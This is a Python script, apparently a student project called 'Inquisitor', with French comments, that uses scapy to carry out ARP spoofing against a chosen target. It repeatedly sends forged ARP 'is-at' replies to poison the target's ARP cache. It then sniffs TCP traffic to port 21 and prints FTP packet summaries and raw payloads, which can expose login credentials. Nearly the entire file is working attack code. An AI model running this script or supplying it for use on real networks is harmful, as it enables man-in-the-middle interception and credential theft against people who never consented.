import argparse
from scapy.all import Ether, ARP, sendp, sniff, TCP, Raw
import subprocess
import time
import sys

def send_arp_packet(src_ip, src_mac, tgt_ip, tgt_mac):
    # Creation d'un paquet Ethernet avec les adresses MAC source et destination
    ether = Ether(src=src_mac, dst=tgt_mac)
    # Creation d'un paquet ARP pour usurper l'adresse IP source
    arp = ARP(psrc=src_ip, pdst=tgt_ip, hwsrc=src_mac, hwdst=tgt_mac, op="is-at")
    # Combiner les deux paquets en un seul
    packet = ether/arp
    # Envoyer le paquet
    sendp(packet)
    print("ARP spoofing packet sent.")

def restore_arp(src_ip, src_mac, tgt_ip, tgt_mac):
    # Envoyer un paquet ARP pour restaurer la table ARP de la victime
    ether = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
    arp = ARP(psrc=src_ip, pdst=tgt_ip, hwsrc=src_mac, hwdst="00:00:00:00:00:00", op="who-has")
    packet = ether/arp
    sendp(packet)
    print("ARP table restored.")

def print_ftp_packet(packet, verbose):
    # Vérifier si le paquet est un paquet TCP et si le port de destination est 21 (FTP)
    if packet.haslayer(TCP) and packet[TCP].dport == 21:
        # Afficher un sommaire du paquet
        print(packet.summary())
        # Si l'option verbose est activée, afficher les détails du paquet
        if verbose:
            packet.show()
        # Si le paquet contient des données RAW (données brutes), les afficher
        if packet.haslayer(Raw):
            print(f"Raw Data: {packet[Raw].load}")

def check_arp_table():
    result = subprocess.run(['arp', '-a'], stdout=subprocess.PIPE)
    print(result.stdout.decode())

def main(src_ip, src_mac, tgt_ip, tgt_mac, verbose):
    try:
        while True:
            send_arp_packet(src_ip, src_mac, tgt_ip, tgt_mac)
            time.sleep(1)
            check_arp_table()
    except KeyboardInterrupt:
        restore_arp(src_ip, src_mac, tgt_ip, tgt_mac)
    sniff(filter="tcp", prn=lambda packet: print_ftp_packet(packet, verbose))
    #check_arp_table()

if __name__ == "__main__":
    # Créez un analyseur d'arguments
    parser = argparse.ArgumentParser(description='Inquisitor tool')
    parser.add_argument('src_ip', help='source IP address')
    parser.add_argument('src_mac', help='source MAC address')
    parser.add_argument('tgt_ip', help='target IP address')
    parser.add_argument('tgt_mac', help='target MAC address')
    parser.add_argument('-v', '--verbose', action='store_true', help='verbose mode')

    # Parse les arguments
    args = parser.parse_args()


    main(args.src_ip, args.src_mac, args.tgt_ip, args.tgt_mac, args.verbose)